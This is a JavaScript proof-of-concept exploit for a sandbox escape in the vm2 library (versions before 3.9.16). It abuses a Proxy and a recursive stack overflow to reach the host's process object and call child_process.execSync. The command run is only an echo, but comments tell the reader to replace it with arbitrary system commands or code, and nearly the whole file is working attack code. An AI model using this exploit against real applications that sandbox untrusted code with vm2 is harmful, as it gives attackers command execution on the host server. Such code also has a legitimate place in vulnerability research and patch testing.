const { VM } = require("vm2-3-9-16");
//version< 3.9.16
//https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244
//echo write malicious code in return process
//Modify the command string in the execSync function to execute system instructions
//modify 'return process' to execute other JavaScript code

const vm = new VM();

const code = `
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync("echo write malicious code in return process").toString();
}
`

console.log(vm.run(code));
